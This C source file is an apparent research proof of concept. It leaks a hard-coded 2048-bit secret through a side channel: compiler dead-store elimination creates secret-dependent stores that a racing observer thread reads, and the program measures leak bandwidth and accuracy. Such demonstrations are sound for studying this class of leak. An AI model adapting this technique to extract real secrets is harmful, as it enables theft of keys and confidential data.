#include <stdio.h>
#include <stdint.h>
#include <stdbool.h>
#include <pthread.h>
#include <unistd.h>  // nanosleep()
#include <stdlib.h>  // exit()
#include <math.h>
#include <string.h>
#include <x86intrin.h>  // rdtsc()
#include "for_0_to_2047.h"

// 2048-bit secret is 32 uint64_t's
static const uint64_t SECRET[32] = {
  0xf07b23a5461d8c9e, 0x198ab650cd723fe4, 0x2f567e10d4a89cb3, 0x9999999999999999,
  0xe67b23a54f1d8c90, 0x198cd650ab723ef4, 0x10567ef2d4a89cb3, 0x6a6a6a6a6a6a6a6a,
  0xf08b23a5461d7c9e, 0x891ab650cd723fe4, 0x2f465e10d7a89cb3, 0x9393939393939393,
  0xe76b23a5f41dc890, 0x098cd651ab723ef4, 0x10567efd24a89cb3, 0x7887788778877887,
  0xf07b23a5461c8d9e, 0x189ab650cd237fe4, 0x2f567e10d4a89cb3, 0x9999999999999999,
  0xe67b23a54f1d8c09, 0x198cd6a05b723ef4, 0x10567ef2d4a89cb3, 0x3333333333333333,
  0xf08b23a5461d7c9e, 0x891ab650cd723fe4, 0x2f465e10d78a9cb3, 0x9595959595959595,
  0xe76b23a5fcd41890, 0x098cd65ab1723ef4, 0x10567def24a89cb3, 0xacacacacacacacac,
};

static volatile bool alwaysFalse = false;
static volatile bool observer_exit = false;
static unsigned x;
static unsigned r;

// attack function for gcc (i.e. not clang/llvm)
#if !defined(__clang__) && !defined(__llvm__)

// if the SECRET-based condition evaluates to false (i.e. the appropriate bit
//   of SECRET was 0), gcc feels the need to keep the x=1 store intact,
//   and the observer thread will probably observe x==1.
// if the SECRET-based condition evaluates to true (i.e. the appropriate bit
//   of SECRET was 1), gcc is fine skipping the dead x=1 store and doing
//   just the x=2 store, and the observer thread cannot observe x==1.
// iters: a tuning parameter, how long we attempt to stall (in some arbitrary
//   time unit) between the two stores to x
#define DECLARE_ATTACKFUNC(bitnum) \
/* don't inline attackfuncs: make gcc optimize each one as one function */ \
static void __attribute__((noinline)) attackfunc_##bitnum(uint64_t iters) { \
  x = 1; \
 \
  /* waste some time, but don't use a syscall like usleep().                 */ \
  /* If we use a syscall, gcc wants to do the x=1 store first, regardless.   */ \
  volatile int v = 0; \
  volatile unsigned *r_vol = &r;  /* volatile so we keep reloading */ \
  do { \
    v++; \
    if(*r_vol > 0) break; /* quit early if observer has already gotten something */ \
  } while(--iters > 0); \
 \
  if(alwaysFalse) { \
    if(SECRET[bitnum/64] & (1ULL<<(bitnum & 63))) x = 2; \
  } else { \
    x = 2; \
  } \
}

#else  // attack function for clang/llvm

#define TWICE(op) op op
#define EIGHT(op) TWICE(TWICE(TWICE(op)))
#define KILO(op) TWICE(EIGHT(EIGHT(EIGHT(op))))
#define MEGA(op) KILO(KILO(op))

// if the SECRET-based condition evaluates to false (i.e. the appropriate bit
//   of SECRET was 0), clang feels the need to keep the x=1 store intact,
//   and the observer thread will probably observe x==1.
// if the SECRET-based condition evaluates to true (i.e. the appropriate bit
//   of SECRET was 1), clang is fine skipping the dead x=1 store and doing
//   just the x=2 store, and the observer thread cannot observe x==1.
// note that for clang we ignore the 'iters' parameter; see notes below
#define DECLARE_ATTACKFUNC(bitnum) \
/* don't inline attackfuncs: make clang optimize each one as one function */ \
static void __attribute__((noinline)) attackfunc_##bitnum(uint64_t junk) { \
  x = 1; \
 \
  /* waste some time, but don't use a syscall like usleep().                    */ \
  /* For clang, we also can't use a loop; the two stores to x must remain in    */ \
  /* the same basic block.                                                      */ \
  /* Otherwise, clang won't eliminate the first store to x, regardless.         */ \
  EIGHT(EIGHT(__rdtsc();)) \
 \
  if(alwaysFalse) { \
    if(SECRET[bitnum/64] & (1ULL<<(bitnum & 63))) x = 2; \
  } else { \
    x = 2; \
  } \
}

#endif  // gcc vs. clang/llvm

// declare all attackfuncs
FOR_0_TO_2047(DECLARE_ATTACKFUNC)

// array storing pointers to all 2048 attackfuncs
void (*attackfunc_array[2048])(uint64_t);

static void set_x_and_wait_for_r(int value) {
  // Volatile aliases so reads and writes actually happen
  volatile unsigned* x_vol = &x;
  volatile unsigned* r_vol = &r;
  *x_vol = value;
  while(*r_vol != value);
}

// bitnum: which bit of the secret to leak
// iters: a tuning parameter passed on to attackfunc()
// returns the guessed value of the bit
static bool leakSingleBit(unsigned bitnum, uint64_t iters) {
  // ensure we properly wait for observer's result than than possibly reading last time's result
  set_x_and_wait_for_r(1);
  set_x_and_wait_for_r(0);

  attackfunc_array[bitnum](iters);

  // use a volatile pointer so that it keeps reloading for real
  volatile unsigned *r_vol = &r;
  unsigned char retval;
  do { retval = *r_vol; } while(retval == 0);  // wait until r is nonzero

  return retval == 2;  // if we observe x==2, then the x=1 store
                       // was (probably) eliminated; see notes on attackfunc()
}

static void* observer(void* dummy) {
  // use volatile pointers so that reads/writes actually happen
  // but we don't want x itself to be volatile, because then DSE isn't allowed
  volatile unsigned* x_vol = &x;
  volatile unsigned* r_vol = &r;

  // loop until main thread tells us to exit
  while(!observer_exit) {
   *r_vol = *x_vol;
  }
  return 0;
}

// iters: a tuning parameter passed on to leakSingleBit()
// error_runs: how many redundant runs to do for error correction
//   a value of '1' means do no error correction
//   higher values indicate more error correction but will take longer
// returns the guessed value of the 2048-bit secret
//   as a heap-allocated array which caller is responsible for freeing
static uint64_t* leak2048bitSecret(uint64_t iters, unsigned error_runs) {
  unsigned run = 0;
  uint64_t* finalLeakedSecret = malloc(32*sizeof(uint64_t));  // 2048 bits
  memset(finalLeakedSecret, 0xff, 32*sizeof(uint64_t));

  do {
    for(unsigned which_64t = 0; which_64t < 32; which_64t++) {
      uint64_t leakedSecret = 0;  // just the 64 bits we're operating on right now
      for(unsigned bitnum = 0; bitnum < 64; bitnum++) {
        unsigned bigbitnum = which_64t*64 + bitnum;
        if(leakSingleBit(bigbitnum, iters)) leakedSecret |= 1ULL << bitnum;
      }
      // if we ever observe 0 in any position, that means we observed x=1,
      // which means the bit is *most definitely* actually 0
      finalLeakedSecret[which_64t] &= leakedSecret;
    }
  } while(++run < error_runs);

  return finalLeakedSecret;
}

// returns a timestamp in nanoseconds
static uint64_t getTime() {
  struct timespec time;
  clock_gettime(CLOCK_MONOTONIC_RAW, &time);
  return (uint64_t)time.tv_sec*1000000000 + (uint64_t)time.tv_nsec;
}

struct manyRuns_res {
  unsigned numOffBy[2049];  // Each index stores how many times leak2048bitSecret()
                            //   was incorrect in exactly that many bits
                            // E.g. numOffBy[0] gives how many times it
                            //   was exactly correct
  unsigned numRuns;  // how many total runs were done (sum of the entries in numOffBy)
  uint64_t elapsedNanoseconds;  // total duration of manyRuns, in nanoseconds
  double ns_per_run;  // how many nanoseconds each run took on average
  double bitAccuracy;  // what percentage of bits were leaked correctly
  double completelyCorrectRate;  // what percentage of trials obtained the completely correct secret
  double leakedBitsPerSec;  // information leak bandwidth, in bits/sec
};

// iters: a tuning parameter passed on to leak2048bitSecret()
// error_runs: a tuning parameter passed on to leak2048bitSecret()
// durationMS: how long to run the program for (approximately), in milliseconds
// res: pointer to a manyRuns_res struct where results should be returned
void manyRuns(uint64_t iters, unsigned error_runs, uint64_t durationMS, struct manyRuns_res* res) {
  // initialize res
  memset(res->numOffBy, 0, 2049*sizeof(unsigned));
  res->numRuns = 0;
  unsigned totalBitsCorrect = 0;

  uint64_t start = getTime();
  uint64_t targetEnd = start + durationMS*1000000;
  while(getTime() < targetEnd) {
    uint64_t* guessedSecret = leak2048bitSecret(iters, error_runs);
    unsigned bitsWrong = 0;
    for(unsigned which_64t = 0; which_64t < 32; which_64t++)
      for(int i = 0; i < 64; i++)
        if((SECRET[which_64t] & (1ULL << i)) ^ (guessedSecret[which_64t] & (1ULL << i))) bitsWrong++;

    totalBitsCorrect += 2048-bitsWrong;
    res->numOffBy[bitsWrong]++;
    res->numRuns++;
    free(guessedSecret);
  }
  uint64_t end = getTime();
  res->elapsedNanoseconds = end-start;
  res->ns_per_run = res->elapsedNanoseconds / (double)res->numRuns;
  double sec_per_run = res->ns_per_run / 1e9;
  res->bitAccuracy = totalBitsCorrect / (double)(2048*res->numRuns);
  res->completelyCorrectRate = res->numOffBy[0] / (double)res->numRuns;
  res->leakedBitsPerSec = 2048 * (1 / sec_per_run);
}

static void printUsage(char* progname) {
  fprintf(stderr, "\n"
                  "Usage: %s tune\n"
                  "    or %s run iters error_runs\n\n"
                  "In the first case, print results for a variety of values for the \"iters\" and \"error_runs\" tuning parameters\n"
                  "In the second case, print results for just the given values of the tuning parameters\n\n"
#if !defined(__clang__) && !defined(__llvm__)
                  "  \"iters\" tuning parameter: how long the main thread waits between its two assignments to x\n"
#else
                  "  \"iters\" tuning parameter: Since this executable was compiled with clang/llvm, this\n"
                  "    parameter is meaningless and ignored\n"
#endif
                  "  \"error_runs\" tuning parameter: how many redundant runs to do for error correction\n"
                  "    (a value of 1 means do no error correction)\n\n"
                  , progname, progname);
}

// how long to run trials for, in milliseconds
#define DURATION_MS 60000
int main(int argc, char* argv[]) {
  bool tuning;
  uint64_t iters;
  unsigned error_runs;
  if(argc == 2) {
    if(strncmp(argv[1], "tune", 5)) {
      fprintf(stderr, "\nWith only one argument, expected \"tune\" but got %s\n", argv[1]);
      printUsage(argv[0]);
      exit(1);
    }
    tuning = true;
  } else if(argc == 4) {
    if(strncmp(argv[1], "run", 4)) {
      fprintf(stderr, "\nWith three arguments, expected the first to be \"run\" but got %s\n", argv[1]);
      printUsage(argv[0]);
      exit(1);
    }
    if(!sscanf(argv[2], "%llu", &iters)) {
      fprintf(stderr, "\nError reading \"iters\" argument\n");
      printUsage(argv[0]);
      exit(1);
    }
    if(!sscanf(argv[3], "%u", &error_runs)) {
      fprintf(stderr, "\nError reading \"error_runs\" argument\n");
      printUsage(argv[0]);
      exit(1);
    }
    tuning = false;
  } else {
    fprintf(stderr, "\nExpected 1 or 3 arguments, got %i\n", argc-1);
    printUsage(argv[0]);
    exit(1);
  }

  // initialize attackfunc array
#define INITIALIZE_ATTACKFUNC(i) attackfunc_array[i] = attackfunc_##i;
  FOR_0_TO_2047(INITIALIZE_ATTACKFUNC)

  // Fire up the observer thread
  pthread_t thread;
  pthread_create(&thread, NULL, &observer, NULL);

  struct manyRuns_res res;

  if(tuning) {

    const unsigned error_runs_vals[] = {1, 2, 3, 4, 5, 7, 10, 15, 20};
    const unsigned length_error_runs_vals = 9;

#if defined(__clang__) || defined(__llvm__)
    // clang tuning: no 'iters' parameter

    printf("(Since this executable was compiled with clang/llvm, the 'iters' parameter is meaningless\n"
           "  so no need to test multiple values for it)\n");

    // column headings
    printf("\n error_runs  leaked bits/sec  %% of bits correct  %% of trials correct\n");

    // C++: for(const unsigned error_runs : error_runs_vals)
    for(const unsigned* error_runs = &error_runs_vals[0];
        error_runs < &error_runs_vals[length_error_runs_vals];
        error_runs++) {
      printf(" %9u  ", *error_runs);
      fflush(stdout);

      manyRuns(1, *error_runs, DURATION_MS, &res);

      printf("   %10.1f         %8.6f%%         %6.2f%%\n", res.leakedBitsPerSec, 100*res.bitAccuracy, 100*res.completelyCorrectRate);
    }

#else  // GCC

    // gcc respects the 'iters' parameter
    const uint64_t iters_vals[] = {10, 20, 50, 100, 200, 500, 1000, 2000, 5000, 10000, 20000, 50000, 100000, 200000};
    const unsigned length_iters_vals = 14;
    printf("\n rows are iters, columns are # of redundant runs\n"
           " each cell is leaked bits per second : %% of bits leaked correctly\n\n");

    // column headings
    printf("       ");
    // C++: for(const unsigned error_runs : error_runs_vals)
    for(const unsigned* error_runs = &error_runs_vals[0];
        error_runs < &error_runs_vals[length_error_runs_vals];
        error_runs++)
      printf("      %-3u       ", *error_runs);
    printf("\n\n");

    // C++: for(const uint64_t iters : iters_vals)
    for(const uint64_t* iters = &iters_vals[0];
        iters < &iters_vals[length_iters_vals];
        iters++) {
      printf("%6llu ", *iters);  // row heading
      fflush(stdout);
      for(const unsigned* error_runs = &error_runs_vals[0];
          error_runs < &error_runs_vals[length_error_runs_vals];
          error_runs++) {
        manyRuns(*iters, *error_runs, DURATION_MS, &res);
        printf("%8.1f : %-7.3f", res.leakedBitsPerSec, 100*res.bitAccuracy);
        fflush(stdout);
      }
      printf("\n");
    }

#endif // GCC

  } else {  // not tuning

    manyRuns(iters, error_runs, DURATION_MS, &res);

    printf("Number of complete 2048-bit trials which were off by x bits:\n");
    unsigned total = 0;
    for(unsigned i = 0; i < 2049 && total != res.numRuns; i++) {
      if(i == 0 || res.numOffBy[i] > 0) printf("%u: %u\n", i, res.numOffBy[i]);
      total += res.numOffBy[i];
    }
    if(total != res.numRuns) printf("more: %u\n", res.numRuns - total);

    printf("%u runs in %.3f sec, or %.3f ms per run\n", res.numRuns, res.elapsedNanoseconds/(double)1e9, res.ns_per_run/1e6);
    printf("  (leak bandwidth %.1f bits/sec after error correction)\n", res.leakedBitsPerSec);
    printf("Overall, after error correction, %.3f%% of bits were correct\n", 100*res.bitAccuracy);
    printf("  and %.1f%% of runs were completely correct\n", 100*res.completelyCorrectRate);

  }

  // tell the observer thread to exit
  observer_exit = true;

  return 0;
}
